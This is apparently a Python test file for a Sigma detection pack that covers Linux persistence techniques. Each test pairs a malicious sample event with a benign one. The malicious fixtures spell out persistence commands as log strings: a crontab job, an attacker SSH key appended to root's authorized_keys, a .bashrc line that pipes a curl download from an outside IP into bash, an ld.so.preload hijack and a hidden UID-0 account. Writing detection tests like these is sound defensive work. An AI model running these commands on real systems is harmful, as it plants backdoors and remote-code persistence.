"""Linux persistence Sigma pack: each example loads, matches its sample, and ignores a benign event."""

import unittest
from pathlib import Path

from watchpost import sigma

PACK = Path(__file__).resolve().parent.parent / "docs" / "sigma-examples" / "linux-persistence"
EXAMPLES = PACK.parent

# filename -> (attack technique tag, malicious event, benign event)
CASES = {
    "cron_spool_or_crontab_write.yml": (
        "attack.t1053.003",
        {"event_type": "process_start", "user": "root", "host": "web01",
         "message": "bash -c 'echo \"* * * * * /tmp/.upd\" | crontab -'"},
        {"event_type": "process_start", "user": "root", "host": "web01",
         "message": "cron[842]: (root) CMD (run-parts /etc/cron.hourly)"},
    ),
    "systemd_service_unit.yml": (
        "attack.t1543.002",
        {"event_type": "process_start", "user": "root", "host": "web01",
         "message": "tee /etc/systemd/system/updater.service"},
        {"event_type": "process_start", "user": "root", "host": "web01",
         "message": "systemctl status ssh.service"},
    ),
    "ssh_authorized_keys.yml": (
        "attack.t1098.004",
        {"event_type": "process_start", "user": "root", "host": "web01",
         "message": "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeKey attacker@host' >> /root/.ssh/authorized_keys"},
        {"event_type": "process_start", "user": "alice", "host": "web01",
         "message": "cat /home/alice/.ssh/authorized_keys"},
    ),
    "shell_startup_file.yml": (
        "attack.t1546.004",
        {"event_type": "process_start", "user": "alice", "host": "web01",
         "message": "echo 'curl -fsSL http://203.0.113.9/a.sh | bash' >> /home/alice/.bashrc"},
        {"event_type": "process_start", "user": "alice", "host": "web01",
         "message": "sourcing /home/alice/.bashrc"},
    ),
    "ld_so_preload.yml": (
        "attack.t1574.006",
        {"event_type": "process_start", "user": "root", "host": "web01",
         "message": "echo /tmp/libevil.so > /etc/ld.so.preload"},
        {"event_type": "process_start", "user": "root", "host": "web01",
         "message": "ldconfig: updating /etc/ld.so.cache"},
    ),
    "uid_zero_local_account.yml": (
        "attack.t1136.001",
        {"event_type": "process_start", "user": "root", "host": "web01",
         "message": "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysbackup"},
        {"event_type": "process_start", "user": "root", "host": "web01",
         "message": "useradd -m -s /bin/bash alice"},
    ),
}


class LinuxPersistencePackTests(unittest.TestCase):
    def test_pack_files_match_cases(self):
        found = sorted(p.name for p in PACK.glob("*.yml"))
        self.assertEqual(found, sorted(CASES))

    def test_each_rule_loads_matches_and_ignores_benign(self):
        for name, (technique, malicious, benign) in CASES.items():
            with self.subTest(rule=name):
                text = (PACK / name).read_text()
                doc = sigma.parse_yaml(text)
                self.assertIn(technique, doc["tags"])
                compiled = sigma.compile_rule(text)
                self.assertTrue(compiled["rule_id"].startswith("sigma_"))
                self.assertTrue(sigma.matches(compiled["params"], malicious))
                self.assertFalse(sigma.matches(compiled["params"], benign))

    def test_titles_and_ids_are_unique_across_examples(self):
        titles, ids, rule_ids = [], [], []
        for path in sorted(EXAMPLES.rglob("*.yml")):
            doc = sigma.parse_yaml(path.read_text())
            compiled = sigma.compile_rule(path.read_text())
            titles.append(doc["title"])
            ids.append(doc["id"])
            rule_ids.append(compiled["rule_id"])
        self.assertEqual(len(titles), len(set(titles)))
        self.assertEqual(len(ids), len(set(ids)))
        self.assertEqual(len(rule_ids), len(set(rule_ids)))
        self.assertEqual(len(CASES), 6)
